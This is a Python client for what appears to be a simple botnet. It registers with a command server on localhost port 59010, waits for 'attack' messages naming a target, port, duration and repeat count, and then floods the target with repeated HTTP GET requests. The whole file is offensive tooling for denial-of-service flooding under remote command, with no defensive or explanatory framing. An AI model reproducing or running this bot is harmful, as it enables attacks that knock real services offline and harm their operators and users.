import requests
import socket
import threading
import time

try:
    alias = input('Choose an alias >>> ')
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 59010))
except socket.error:
    print('server not working')


def attack(target, port, timer):
    timeout = time.time() + 1 * timer
    while time.time() < timeout:
        URL = "http://" + target + ":" + port + "/"
        print(URL)
        # location given here
        location = "client2"

        # defining a params dict for the parameters to be sent to the API
        PARAMS = {'address': location}

        # sending get request and saving the response as response object
        r = requests.get(url=URL, params=PARAMS)
        print("Sent to %s => response: %d" % (URL, r.status_code))
        # extracting data in json format


def call_attack(target, port, timer, threads):
    print('\n[+] Starting Attack...')
    # print('\n[+] ============> 15%')
    # time.sleep(3)
    # print('\n[+] ===========================> 30%')
    # time.sleep(3)
    # print('\n[+] ==========================================> 70%')
    # time.sleep(3)
    # print('\n[+] ===========================================================> 100%')
    for x in range(0, int(threads)):
        attack(target, port, int(timer))

    print('\n[+] attack done')


def client_receive():
    while True:
        message = client.recv(1024).decode('utf-8')
        if "attack" in message:
            data = message.split()
            call_attack(data[1], data[2], data[3], data[4])
        elif message == "alias?":
            client.send(alias.encode('utf-8'))
        else:
            print(message)



# def client_send():
#     while True:
#         message = f'{alias}: {input("")}'
#         client.send(message.encode('utf-8'))


receive_thread = threading.Thread(target=client_receive)
receive_thread.start()

# send_thread = threading.Thread(target=client_send)
# send_thread.start()
